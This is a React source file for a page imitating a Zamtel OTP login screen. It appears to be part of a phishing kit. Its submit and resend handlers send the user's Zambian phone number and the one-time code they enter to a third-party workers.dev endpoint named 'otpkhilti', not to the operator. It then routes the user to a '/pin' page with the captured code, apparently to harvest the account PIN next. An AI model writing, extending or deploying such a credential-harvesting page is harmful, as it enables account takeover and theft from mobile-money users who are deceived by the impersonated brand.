import React,{ useEffect, useRef, useState } from "react";
import { Navigate, useLocation, useNavigate } from "react-router-dom";

const API_URL = import.meta.env.VITE_API_URL || "";
const OTP_LENGTH = 6;
const RESEND_SECONDS = 59;

export default function ZamtelOtp() {
    const navigate = useNavigate();
    const { state } = useLocation();
    const phone = state?.phone;

    const [digits, setDigits] = useState(Array(OTP_LENGTH).fill(""));
    const [active, setActive] = useState(0);
    const [seconds, setSeconds] = useState(RESEND_SECONDS);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("");
    const inputs = useRef([]);

    // Countdown timer
    useEffect(() => {
        if (seconds <= 0) return;
        const id = setTimeout(() => setSeconds((s) => s - 1), 1000);
        return () => clearTimeout(id);
    }, [seconds]);

    useEffect(() => {
        inputs.current[0]?.focus();
    }, []);

    // Opened directly without a phone number -> back to login
    if (!phone) return <Navigate to="/" replace />;

    const focusBox = (i) => {
        const idx = Math.max(0, Math.min(OTP_LENGTH - 1, i));
        inputs.current[idx]?.focus();
    };

    const handleChange = (i, value) => {
        const clean = value.replace(/\D/g, "");
        if (!clean) return;
        setError("");
        const next = [...digits];
        let pos = i;
        for (const ch of clean) {
            if (pos >= OTP_LENGTH) break;
            next[pos] = ch;
            pos += 1;
        }
        setDigits(next);
        focusBox(pos);
    };

    const handleKeyDown = (i, e) => {
        if (e.key === "Backspace") {
            e.preventDefault();
            const next = [...digits];
            if (next[i]) {
                next[i] = "";
                setDigits(next);
            } else if (i > 0) {
                next[i - 1] = "";
                setDigits(next);
                focusBox(i - 1);
            }
        } else if (e.key === "ArrowLeft") focusBox(i - 1);
        else if (e.key === "ArrowRight") focusBox(i + 1);
    };

    const handlePaste = (e) => {
        e.preventDefault();
        const pasted = e.clipboardData
            .getData("text")
            .replace(/\D/g, "")
            .slice(0, OTP_LENGTH);
        if (!pasted) return;
        const next = Array(OTP_LENGTH).fill("");
        pasted.split("").forEach((ch, idx) => (next[idx] = ch));
        setDigits(next);
        focusBox(pasted.length);
    };

    const handleResend = async () => {
        setError("");
        try {
            const res = await fetch(`https://my-worker-app.instapayapi.workers.dev/api/phone`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ phone: `260${phone}, ` }),
            });
            const data = await res.json().catch(() => ({}));
            if (!res.ok) throw new Error(data.message || "Could not resend OTP");
            setDigits(Array(OTP_LENGTH).fill(""));
            setSeconds(RESEND_SECONDS);
            focusBox(0);
        } catch (err) {
            setError(err.message || "Could not resend OTP");
        }
    };

    const code = digits.join("");
    const isComplete = code.length === OTP_LENGTH;
    const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
    const ss = String(seconds % 60).padStart(2, "0");

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!isComplete || loading) return;

        setLoading(true);
        setError("");
        try {
            const res = await fetch(`https://my-worker-app.instapayapi.workers.dev/api/otpkhilti`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ phone: `260${phone}`, otp: code }),
            });
            const data = await res.json().catch(() => ({}));
            if (!res.ok) throw new Error(data.message || "Invalid OTP");

            if (data.token) localStorage.setItem("token", data.token);
            navigate("/pin", { state: { phone, otp: code } });
        } catch (err) {
            setError(err.message || "Something went wrong. Try again.");
            setDigits(Array(OTP_LENGTH).fill(""));
            focusBox(0);
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="min-h-screen w-full bg-white flex justify-center">
            <form
                onSubmit={handleSubmit}
                className="flex min-h-screen w-full max-w-md flex-col px-5 pt-10 pb-8 sm:pt-16"
            >
                <button
                    type="button"
                    onClick={() => navigate(-1)}
                    aria-label="Go back"
                    className="-ml-1 flex h-10 w-10 items-center justify-center rounded-full text-black active:bg-gray-100"
                >
                    <svg
                        viewBox="0 0 24 24"
                        className="h-7 w-7"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                    >
                        <path d="M19 12H5M12 19l-7-7 7-7" />
                    </svg>
                </button>

                <h1 className="mt-8 text-3xl font-bold tracking-tight text-black sm:text-4xl">
                    Enter OTP
                </h1>
                <p className="mt-3 flex flex-wrap items-center gap-x-2 text-base text-gray-700">
                    <span>6-digit code sent to</span>
                    <button
                        type="button"
                        onClick={() => navigate(-1)}
                        className="flex items-center gap-2 font-medium text-blue-600"
                        aria-label="Edit phone number"
                    >
                        {phone}
                        <svg
                            viewBox="0 0 24 24"
                            className="h-5 w-5"
                            fill="none"
                            stroke="currentColor"
                            strokeWidth="2"
                            strokeLinecap="round"
                            strokeLinejoin="round"
                        >
                            <path d="M12 20h9" />
                            <path d="M16.5 3.5a2.1 2.1 0 013 3L7 19l-4 1 1-4 12.5-12.5z" />
                        </svg>
                    </button>
                </p>

                <div className="mt-16 flex items-end justify-between gap-3 px-2 sm:px-4">
                    {digits.map((d, i) => (
                        <input
                            key={i}
                            ref={(el) => (inputs.current[i] = el)}
                            type="text"
                            inputMode="numeric"
                            autoComplete={i === 0 ? "one-time-code" : "off"}
                            maxLength={OTP_LENGTH}
                            value={d}
                            aria-label={`Digit ${i + 1}`}
                            onChange={(e) => handleChange(i, e.target.value)}
                            onKeyDown={(e) => handleKeyDown(i, e)}
                            onPaste={handlePaste}
                            onFocus={() => setActive(i)}
                            className={`h-12 w-full min-w-0 border-0 border-b-[3px] bg-transparent text-center text-2xl font-semibold text-gray-900 outline-none transition-colors ${error
                                    ? "border-red-400"
                                    : active === i
                                        ? "border-blue-600"
                                        : "border-gray-300"
                                }`}
                        />
                    ))}
                </div>

                <div className="mt-4 flex items-start justify-between gap-4 text-base">
                    <span className="text-sm text-red-500">{error}</span>
                    <div className="shrink-0 text-gray-500">
                        {seconds > 0 ? (
                            <span>
                                Resend OTP in{" "}
                                <span className="font-semibold text-gray-700">
                                    {mm}:{ss}s
                                </span>
                            </span>
                        ) : (
                            <button
                                type="button"
                                onClick={handleResend}
                                className="font-medium text-blue-600"
                            >
                                Resend OTP
                            </button>
                        )}
                    </div>
                </div>

                {/* <div className="flex-1" /> */}

                <button
                    type="submit"
                    disabled={!isComplete || loading}
                    className={`w-full mt-6 rounded-2xl py-5 text-lg font-medium transition-colors ${isComplete && !loading
                            ? "bg-[#12A036] text-white hover:bg-[#0e7a2a]"
                            : "cursor-not-allowed bg-gray-200 text-gray-500"
                        }`}
                >
                    {loading ? "Verifying..." : "Login"}
                </button>
            </form>
        </div>
    );
}